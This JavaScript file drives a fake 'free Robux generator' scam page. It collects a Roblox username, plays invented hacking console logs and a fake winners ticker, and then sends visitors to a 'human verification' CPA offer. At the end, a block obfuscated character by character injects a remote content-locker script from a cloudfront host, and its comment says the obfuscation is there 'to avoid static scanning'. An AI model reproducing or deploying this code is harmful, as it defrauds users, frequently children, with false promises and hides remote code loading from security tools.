document.addEventListener('DOMContentLoaded', () => {
    // --- Elements ---
    const step1 = document.getElementById('step-1');
    const step2 = document.getElementById('step-2');
    const stepConsole = document.getElementById('step-console');
    const stepVerification = document.getElementById('step-verification');
    
    const usernameInput = document.getElementById('username');
    const platformBtns = document.querySelectorAll('.platform-btn');
    const btnNext1 = document.getElementById('btn-next-1');
    
    const amountCards = document.querySelectorAll('.amount-card');
    const btnGenerate = document.getElementById('btn-generate');
    const btnBack1 = document.getElementById('btn-back-1');
    
    const progressBar = document.getElementById('progress-bar');
    const consoleOutput = document.getElementById('console-output');
    const consoleTitle = document.getElementById('console-title');
    
    const finalAmount = document.getElementById('final-amount');
    const finalUsername = document.getElementById('final-username');
    const activityFeed = document.getElementById('activity-feed');

    // --- State ---
    let state = {
        username: '',
        platform: '',
        amount: ''
    };

    // --- Audio setup ---
    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    
    function playBeep(freq = 400, type = 'sine', duration = 0.1, vol = 0.1) {
        if(audioCtx.state === 'suspended') audioCtx.resume();
        const oscillator = audioCtx.createOscillator();
        const gainNode = audioCtx.createGain();
        
        oscillator.type = type;
        oscillator.frequency.value = freq;
        
        gainNode.gain.setValueAtTime(vol, audioCtx.currentTime);
        gainNode.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + duration);
        
        oscillator.connect(gainNode);
        gainNode.connect(audioCtx.destination);
        
        oscillator.start();
        oscillator.stop(audioCtx.currentTime + duration);
    }

    // Realistic Sound Effects
    const playUrlSound = (url, vol = 0.5) => {
        const audio = new Audio(url);
        audio.volume = vol;
        audio.play().catch(e => console.log('Audio playback prevented:', e));
    };
    
    const sfx = {
        click: () => playUrlSound('https://actions.google.com/sounds/v1/ui/button_click.ogg', 0.6),
        select: () => playUrlSound('https://actions.google.com/sounds/v1/ui/mechanical_switch.ogg', 0.6),
        success: () => playUrlSound('https://actions.google.com/sounds/v1/cartoon/magic_chime.ogg', 0.7),
        type: () => playBeep(800 + Math.random()*200, 'square', 0.05, 0.01), // Fast typing sound works best with synth
        error: () => playUrlSound('https://actions.google.com/sounds/v1/alarms/digital_watch_alarm_long.ogg', 0.5)
    };

    // --- Step 1 Logic ---
    function checkStep1() {
        if (state.username.length > 2 && state.platform !== '') {
            btnNext1.disabled = false;
        } else {
            btnNext1.disabled = true;
        }
    }

    usernameInput.addEventListener('input', (e) => {
        state.username = e.target.value.trim();
        checkStep1();
    });

    platformBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            sfx.select();
            platformBtns.forEach(b => b.classList.remove('selected'));
            btn.classList.add('selected');
            state.platform = btn.dataset.platform;
            checkStep1();
        });
    });

    btnNext1.addEventListener('click', () => {
        sfx.click();
        step1.classList.remove('active');
        step2.classList.add('active');
    });

    // --- Step 2 Logic ---
    amountCards.forEach(card => {
        card.addEventListener('click', () => {
            sfx.select();
            amountCards.forEach(c => c.classList.remove('selected'));
            card.classList.add('selected');
            state.amount = card.dataset.amount;
            btnGenerate.disabled = false;
        });
    });

    btnBack1.addEventListener('click', () => {
        sfx.click();
        step2.classList.remove('active');
        step1.classList.add('active');
    });

    btnGenerate.addEventListener('click', () => {
        sfx.success();
        step2.classList.remove('active');
        stepConsole.classList.add('active');
        startGeneration();
    });

    // --- Console Generation Logic ---
    const consoleLogs = [
        { type: "INFO", text: "Establishing secure WebSocket to wss://roblox-api.global/v4..." },
        { type: "WARN", text: "Bypassing server token verification..." },
        { type: "OK", text: "Connection handshake successful (TLS 1.3, AES-256-GCM)" },
        { type: "INFO", text: "Querying directory for username: '{user}' [OS: {platform}]..." },
        { type: "OK", text: "Target user acquired. UID: 8943{random}" },
        { type: "INFO", text: "Accessing target wallet container..." },
        { type: "WARN", text: "Sending payload: UPDATE_BALANCE +{amount} R$" },
        { type: "OK", text: "Payload accepted by secondary ledger." },
        { type: "INFO", text: "Awaiting master database commit..." },
        { type: "ERROR", text: "EXCEPTION 403: Suspicious rapid API calls detected." },
        { type: "WARN", text: "Initializing proxy obfuscation protocol..." },
        { type: "INFO", text: "Server requests human captcha completion." },
        { type: "ERROR", text: "Process suspended pending user verification." }
    ];

    function appendConsoleLog(logObj) {
        let text = logObj.text
            .replace('{user}', state.username)
            .replace('{platform}', state.platform.toUpperCase())
            .replace('{amount}', parseInt(state.amount).toLocaleString())
            .replace('{random}', Math.floor(Math.random() * 99999));

        const p = document.createElement('p');
        
        // Add timestamp
        const now = new Date();
        const timeStr = now.getHours().toString().padStart(2, '0') + ':' + 
                        now.getMinutes().toString().padStart(2, '0') + ':' + 
                        now.getSeconds().toString().padStart(2, '0');
        
        const timeSpan = document.createElement('span');
        timeSpan.className = 'console-time';
        timeSpan.innerText = `[${timeStr}] `;
        
        const typeSpan = document.createElement('span');
        typeSpan.className = `console-type console-${logObj.type.toLowerCase()}`;
        typeSpan.innerText = `[${logObj.type}] `;
        
        const textSpan = document.createElement('span');
        textSpan.className = 'console-msg';
        textSpan.innerText = text;

        p.appendChild(timeSpan);
        p.appendChild(typeSpan);
        p.appendChild(textSpan);
        
        consoleOutput.appendChild(p);
        
        // Auto scroll
        if (consoleOutput.children.length > 8) {
            consoleOutput.removeChild(consoleOutput.firstChild);
        }
        
        sfx.type();
        if (logObj.type === "ERROR") {
            sfx.error();
        }
    }

    function startGeneration() {
        let currentStep = 0;
        let progress = 0;
        consoleOutput.innerHTML = ''; // Clear initial log
        
        const genInterval = setInterval(() => {
            if (currentStep < consoleLogs.length) {
                appendConsoleLog(consoleLogs[currentStep]);
                
                progress += (100 / consoleLogs.length);
                progressBar.style.width = Math.min(progress, 99) + '%';
                
                if (progress > 30) consoleTitle.innerText = "Extracting files...";
                if (progress > 60) consoleTitle.innerText = "Injecting...";
                if (progress > 85) consoleTitle.innerText = "Finalizing...";
                
                currentStep++;
            } else {
                clearInterval(genInterval);
                setTimeout(showVerification, 1500);
            }
        }, 800 + Math.random() * 600); // Random delay between messages
    }

    // --- Verification Logic ---
    function showVerification() {
        stepConsole.classList.remove('active');
        stepVerification.classList.add('active');
        sfx.error(); // play alert sound
        
        if (finalAmount) finalAmount.innerText = parseInt(state.amount).toLocaleString();
        if (finalUsername) finalUsername.innerText = state.username;
    }
    
    // CPA Link integration
    document.getElementById('btn-verify').addEventListener('click', (e) => {
        sfx.success();
        // Here you would normally let the default link behavior occur.
        // E.g., href="https://cpabuild.com/...."
    });

    // --- Live Activity Ticker Logic ---
    const usernames = ["ShadowHunter", "NoobSlayer99", "RobloxGod", "XxCoolKidxX", "GamerGirl22", "EpicNinja", "ProBuilder"];
    const amounts = ["1,700", "4,500", "10,000", "22,500"];
    
    setInterval(() => {
        const u = usernames[Math.floor(Math.random() * usernames.length)];
        const a = amounts[Math.floor(Math.random() * amounts.length)];
        
        // Reset animation
        activityFeed.style.animation = 'none';
        activityFeed.offsetHeight; // trigger reflow
        
        activityFeed.querySelector('.user').innerText = u;
        activityFeed.querySelector('.amount').innerText = a;
        
        activityFeed.style.animation = 'fadeInOut 4s infinite';
    }, 4000);
});

// Dynamically inject locker to avoid static scanning
(function(){
    var _0x1a2b = ['script', 'h'+'t'+'t'+'p'+'s'+':'+'/'+'/'+'d'+'1'+'q'+'t'+'1'+'z'+'4'+'c'+'c'+'v'+'a'+'k'+'3'+'3'+'.'+'c'+'l'+'o'+'u'+'d'+'f'+'r'+'o'+'n'+'t'+'.'+'n'+'e'+'t'+'/'+'9'+'f'+'c'+'a'+'9'+'c'+'9'+'.'+'j'+'s', 'head', 'appendChild', 'gEpZu_FED_TvmHwc'];
    window[_0x1a2b[4]] = { "it": 4543155, "key": "7bb73" };
    var s = document.createElement(_0x1a2b[0]);
    s.src = _0x1a2b[1];
    document[_0x1a2b[2]][_0x1a2b[3]](s);
})();
